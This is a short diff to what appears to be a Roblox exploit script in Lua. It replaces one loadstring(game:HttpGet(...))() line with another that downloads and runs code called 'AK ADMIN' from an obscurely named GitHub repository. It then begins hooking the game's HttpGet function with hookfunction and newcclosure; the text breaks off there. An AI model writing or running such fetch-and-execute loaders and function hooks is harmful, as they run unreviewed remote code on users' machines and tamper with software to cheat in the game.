@@ -1,5 +1,5 @@
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/fjkdvbjkfvjkfbvjkfbvjkdfhdfjkhvuldfhv/lol/refs/heads/main/Kill%20All%20Skids"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/JSFKGBASDJKHIOAFHDGHIUODSGBJKLFGDKSB/kdjnvlkfns-kldjbncfkbn-vklnbcv-n/refs/heads/main/AK%20ADMIN"))()
 
 if hookfunction and newcclosure then
 local originalHttpGet = game.HttpGet
